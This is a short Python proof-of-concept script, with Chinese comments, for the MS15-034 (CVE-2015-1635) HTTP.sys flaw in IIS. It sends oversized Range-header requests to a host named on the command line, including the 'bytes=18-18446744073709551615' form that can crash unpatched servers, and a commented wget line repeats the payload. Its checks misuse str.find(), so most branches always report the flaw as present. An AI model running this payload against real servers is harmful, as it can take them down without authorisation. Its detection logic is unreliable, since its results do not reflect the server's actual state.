#声明：验证MS15-034<CVE-2015-1635>漏洞的POC代码

import requests
import sys

url = "http://"+sys.argv[1]

result = requests.get(url)
print(result.headers['Server'])
if result.headers['Server'].find("IIS/7.5") or result.headers['Server'].find("IIS/8.0"):
    # Host: stuff 
    # Range: bytes=0-18446744073709551615------>(0xFFFFFFFFFFFFFFFF)整数溢出
    payload = {"Host":"stuff","Range":"bytes=0-18446744073709551615"}
    result_new = requests.get(url,headers=payload)
    if result_new.text.find("Request Range Not Satisfiable") :
        print("MS15-034漏洞存在")
    else :
        try :        
            url = "http://"+sys.argv[1]+"/iisstart.html"
            result = requests.get(url)
            payload = {"Host":"stuff","Range":"bytes=18-18446744073709551615"}
            result_new = requests.get(url,headers=payload)
            if result_new.text.find("Request Range Not Satisfiable"):
                print("MS15-034漏洞Payload验证存在,修复建议：禁用 IIS 内核缓存")
            elif result_new.text.find("The request has an invaild header name "):
                print("MS15-034漏洞不存在")
            else:
                print("无法确认，请尝试使用curl命令或wget工具进行检测")
                # wget target ip  -debug -header= "Range:byte=0-18446744073709551615"
        except :
            print("IISstart页面不存在，请尝试验证")
        
       